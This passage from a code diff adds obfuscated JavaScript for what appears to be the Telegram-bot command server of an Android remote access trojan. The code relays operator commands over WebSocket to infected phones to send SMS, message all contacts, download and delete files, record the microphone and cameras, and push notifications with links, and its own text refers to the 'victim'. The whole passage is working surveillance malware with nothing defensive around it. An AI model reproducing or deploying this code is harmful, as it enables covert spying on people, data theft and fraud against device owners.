+        ('\u2022 ʙᴀᴛᴛᴇʀʏ : <b>' + _0x5409ca + '</b>\n') +
+        ('\u2022 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>' + _0x4a1a34 + '</b>\n') +
+        ('\u2022 ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>' + _0x340b05 + '</b>\n') +
+        ('\u2022 ᴘʀᴏᴠɪᴅᴇʀ : <b>' + _0x1dd883 + '</b>'),
+      { parse_mode: 'HTML' }
+    )
+    appClients.delete(_0x466cd0.uuid)
+  })
+})
+appBot.on('message', (_0x2ca88f) => {
+  const _0x32d1ff = _0x2ca88f.chat.id
+  if (_0x2ca88f.reply_to_message) {
+    _0x2ca88f.reply_to_message.text.includes(
+      '\xB0\u2022 \uD835\uDE4B\uD835\uDE61\uD835\uDE5A\uD835\uDE56\uD835\uDE68\uD835\uDE5A \uD835\uDE67\uD835\uDE5A\uD835\uDE65\uD835\uDE61\uD835\uDE6E \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE64 \uD835\uDE6C\uD835\uDE5D\uD835\uDE5E\uD835\uDE58\uD835\uDE5D \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE4E\uD835\uDE48\uD835\uDE4E'
+    ) &&
+      ((currentNumber = _0x2ca88f.text),
+      appBot.sendMessage(
+        id,
+        '\xB0\u2022 \uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69, \uD835\uDE63\uD835\uDE64\uD835\uDE6C \uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE64 \uD835\uDE69\uD835\uDE5D\uD835\uDE5E\uD835\uDE68 \uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67\n\n\u2022 ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
+        { reply_markup: { force_reply: true } }
+      ))
+    _0x2ca88f.reply_to_message.text.includes(
+      '\xB0\u2022 \uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69, \uD835\uDE63\uD835\uDE64\uD835\uDE6C \uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE64 \uD835\uDE69\uD835\uDE5D\uD835\uDE5E\uD835\uDE68 \uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67'
+    ) &&
+      (appSocket.clients.forEach(function _0x52e72d(_0x465249) {
+        _0x465249.uuid == currentUuid &&
+          _0x465249.send('send_message:' + currentNumber + '/' + _0x2ca88f.text)
+      }),
+      (currentNumber = ''),
+      (currentUuid = ''),
+      appBot.sendMessage(
+        id,
+        '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
+        {
+          parse_mode: 'HTML',
+          reply_markup: {
+            keyboard: [
+              [
+                '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
+              ],
+              [
+                '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
+              ],
+            ],
+            resize_keyboard: true,
+          },
+        }
+      ))
+    if (
+      _0x2ca88f.reply_to_message.text.includes(
+        '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE61\uD835\uDE61 \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE69\uD835\uDE56\uD835\uDE58\uD835\uDE69\uD835\uDE68'
+      )
+    ) {
+      const _0x1f6562 = _0x2ca88f.text
+      appSocket.clients.forEach(function _0x308191(_0x3a189f) {
+        _0x3a189f.uuid == currentUuid &&
+          _0x3a189f.send('send_message_to_all:' + _0x1f6562)
+      })
+      currentUuid = ''
+      appBot.sendMessage(
+        id,
+        '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
+        {
+          parse_mode: 'HTML',
+          reply_markup: {
+            keyboard: [
+              [
+                '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
+              ],
+              [
+                '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
+              ],
+            ],
+            resize_keyboard: true,
+          },
+        }
+      )
+    }
+    if (
+      _0x2ca88f.reply_to_message.text.includes(
+        '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D \uD835\uDE64\uD835\uDE5B \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE59\uD835\uDE64\uD835\uDE6C\uD835\uDE63\uD835\uDE61\uD835\uDE64\uD835\uDE56\uD835\uDE59'
+      )
+    ) {
+      const _0x500514 = _0x2ca88f.text
+      appSocket.clients.forEach(function _0x5ccade(_0x1bb0ba) {
+        _0x1bb0ba.uuid == currentUuid && _0x1bb0ba.send('file:' + _0x500514)
+      })
+      currentUuid = ''
+      appBot.sendMessage(
+        id,
+        '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
+        {
+          parse_mode: 'HTML',
+          reply_markup: {
+            keyboard: [
+              [
+                '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
+              ],
+              [
+                '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
+              ],
+            ],
+            resize_keyboard: true,
+          },
+        }
+      )
+    }
+    if (
+      _0x2ca88f.reply_to_message.text.includes(
+        '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D \uD835\uDE64\uD835\uDE5B \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE59\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE69\uD835\uDE5A'
+      )
+    ) {
+      const _0x217e4d = _0x2ca88f.text
+      appSocket.clients.forEach(function _0x174aee(_0x4e86bf) {
+        _0x4e86bf.uuid == currentUuid &&
+          _0x4e86bf.send('delete_file:' + _0x217e4d)
+      })
+      currentUuid = ''
+      appBot.sendMessage(
+        id,
+        '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
+        {
+          parse_mode: 'HTML',
+          reply_markup: {
+            keyboard: [
+              [
+                '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
+              ],
+              [
+                '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
+              ],
+            ],
+            resize_keyboard: true,
+          },
+        }
+      )
+    }
+    if (
+      _0x2ca88f.reply_to_message.text.includes(
+        '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5E\uD835\uDE58\uD835\uDE67\uD835\uDE64\uD835\uDE65\uD835\uDE5D\uD835\uDE64\uD835\uDE63\uD835\uDE5A \uD835\uDE69\uD835\uDE64 \uD835\uDE57\uD835\uDE5A \uD835\uDE67\uD835\uDE5A\uD835\uDE58\uD835\uDE64\uD835\uDE67\uD835\uDE59\uD835\uDE5A\uD835\uDE59'
+      )
+    ) {
+      const _0x513bae = _0x2ca88f.text
+      appSocket.clients.forEach(function _0x511718(_0x461ab3) {
+        _0x461ab3.uuid == currentUuid &&
+          _0x461ab3.send('microphone:' + _0x513bae)
+      })
+      currentUuid = ''
+      appBot.sendMessage(
+        id,
+        '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
+        {
+          parse_mode: 'HTML',
+          reply_markup: {
+            keyboard: [
+              [
+                '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
+              ],
+              [
+                '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
+              ],
+            ],
+            resize_keyboard: true,
+          },
+        }
+      )
+    }
+    if (
+      _0x2ca88f.reply_to_message.text.includes(
+        '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE56\uD835\uDE5E\uD835\uDE63 \uD835\uDE58\uD835\uDE56\uD835\uDE62\uD835\uDE5A\uD835\uDE67\uD835\uDE56 \uD835\uDE69\uD835\uDE64 \uD835\uDE57\uD835\uDE5A \uD835\uDE67\uD835\uDE5A\uD835\uDE58\uD835\uDE64\uD835\uDE67\uD835\uDE59\uD835\uDE5A\uD835\uDE59'
+      )
+    ) {
+      const _0x517fdd = _0x2ca88f.text
+      appSocket.clients.forEach(function _0x2f88ab(_0x4f49b1) {
+        _0x4f49b1.uuid == currentUuid &&
+          _0x4f49b1.send('rec_camera_main:' + _0x517fdd)
+      })
+      currentUuid = ''
+      appBot.sendMessage(
+        id,
+        '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
+        {
+          parse_mode: 'HTML',
+          reply_markup: {
+            keyboard: [
+              [
+                '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
+              ],
+              [
+                '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
+              ],
+            ],
+            resize_keyboard: true,
+          },
+        }
+      )
+    }
+    if (
+      _0x2ca88f.reply_to_message.text.includes(
+        '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE68\uD835\uDE5A\uD835\uDE61\uD835\uDE5B\uD835\uDE5E\uD835\uDE5A \uD835\uDE58\uD835\uDE56\uD835\uDE62\uD835\uDE5A\uD835\uDE67\uD835\uDE56 \uD835\uDE69\uD835\uDE64 \uD835\uDE57\uD835\uDE5A \uD835\uDE67\uD835\uDE5A\uD835\uDE58\uD835\uDE64\uD835\uDE67\uD835\uDE59\uD835\uDE5A\uD835\uDE59'
+      )
+    ) {
+      const _0xf2c05e = _0x2ca88f.text
+      appSocket.clients.forEach(function _0x1c2fc4(_0x183617) {
+        _0x183617.uuid == currentUuid &&
+          _0x183617.send('rec_camera_selfie:' + _0xf2c05e)
+      })
+      currentUuid = ''
+      appBot.sendMessage(
+        id,
+        '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
+        {
+          parse_mode: 'HTML',
+          reply_markup: {
+            keyboard: [
+              [
+                '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
+              ],
+              [
+                '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
+              ],
+            ],
+            resize_keyboard: true,
+          },
+        }
+      )
+    }
+    if (
+      _0x2ca88f.reply_to_message.text.includes(
+        '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE69\uD835\uDE5D\uD835\uDE56\uD835\uDE69 \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67 \uD835\uDE64\uD835\uDE63 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE69\uD835\uDE56\uD835\uDE67\uD835\uDE5C\uD835\uDE5A\uD835\uDE69 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A'
+      )
+    ) {
+      const _0x5f1498 = _0x2ca88f.text
+      appSocket.clients.forEach(function _0x1547d2(_0x523d20) {
+        _0x523d20.uuid == currentUuid && _0x523d20.send('toast:' + _0x5f1498)
+      })
+      currentUuid = ''
+      appBot.sendMessage(
+        id,
+        '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
+        {
+          parse_mode: 'HTML',
+          reply_markup: {
+            keyboard: [
+              [
+                '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
+              ],
+              [
+                '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
+              ],
+            ],
+            resize_keyboard: true,
+          },
+        }
+      )
+    }
+    if (
+      _0x2ca88f.reply_to_message.text.includes(
+        '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67 \uD835\uDE56\uD835\uDE68 \uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63'
+      )
+    ) {
+      const _0x531cc1 = _0x2ca88f.text
+      currentTitle = _0x531cc1
+      appBot.sendMessage(
+        id,
+        '\xB0\u2022 \uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69, \uD835\uDE63\uD835\uDE64\uD835\uDE6C \uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60 \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE57\uD835\uDE5A \uD835\uDE64\uD835\uDE65\uD835\uDE5A\uD835\uDE63\uD835\uDE5A\uD835\uDE59 \uD835\uDE57\uD835\uDE6E \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63\n\n\u2022 ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ',
+        { reply_markup: { force_reply: true } }
+      )
+    }
+    if (
+      _0x2ca88f.reply_to_message.text.includes(
+        '\xB0\u2022 \uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69, \uD835\uDE63\uD835\uDE64\uD835\uDE6C \uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60 \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE57\uD835\uDE5A \uD835\uDE64\uD835\uDE65\uD835\uDE5A\uD835\uDE63\uD835\uDE5A\uD835\uDE59 \uD835\uDE57\uD835\uDE6E \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63'
+      )
+    ) {
+      const _0x4c37b7 = _0x2ca88f.text
+      appSocket.clients.forEach(function _0x19b737(_0x13f3d9) {
+        _0x13f3d9.uuid == currentUuid &&
+          _0x13f3d9.send('show_notification:' + currentTitle + '/' + _0x4c37b7)
+      })
+      currentUuid = ''
+      appBot.sendMessage(
+        id,
